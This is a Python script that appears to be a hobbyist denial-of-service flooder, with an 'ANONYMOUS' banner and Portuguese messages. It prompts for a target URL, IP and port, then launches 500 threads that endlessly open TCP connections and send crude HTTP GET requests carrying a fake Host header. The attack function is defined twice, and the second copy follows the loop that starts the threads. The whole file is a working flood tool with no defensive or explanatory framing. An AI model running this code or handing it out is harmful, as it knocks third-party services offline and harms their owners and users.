import threading
from threading import Thread, Timer
import requests
from concurrent.futures import ThreadPoolExecutor
from random import choice, randint
from socket import socket, AF_INET, SOCK_STREAM, error
from time import sleep
import socket, threading
from threading import Thread
import random
import time
import socket
import os, sys

os.system("clear")
print("""
         __      ANONYMOUS       _____
        / /  __ _ _   _  ___ _  |___  |
       / /  / _` | | | |/ _ \ '__| / /
      / /__| (_| | |_| |  __/ |   / /
      \____/\__,_|\__, |\___|_|  /_/
                  |___/
              ADDED NEW METHOD 
              Atacando porta 💥
""")

time.sleep(3.5)
#########################################################################
# IMPORT MODULE
import os, sys, socket, threading, random
#########################################################################
# CLEAR
def clear():
	os.system('cls' if os.name=='nt' else 'clear')
#########################################################################
#ip
url = input(" Url: => ")
url_chek =requests.get(url)
ip = socket.gethostbyname(url.replace("https://","").replace("http://",""))
print(ip)
#########################################################################
# MAIN MENU 
print()
target = str(input("\033[94m╔═══\033[91m[ IP ] •\n\033[94m╠══>\033[0m "))
port = int(input("\033[94m╠═══\033[91m[ PORT ] •\n\033[94m╠══>\033[0m "))
clear()
print("\033[94m")
#########################################################################

fake_ip = '77.109.33.232'

def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
        s.close()
for i in range(500):
    thread = threading.Thread(target=attack)
    thread.start()
    attack_num = 0

def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))

        global attack_num
        attack_num += 1
        print(attack_num)
        print("Atacando porta 💥")
        s.close()
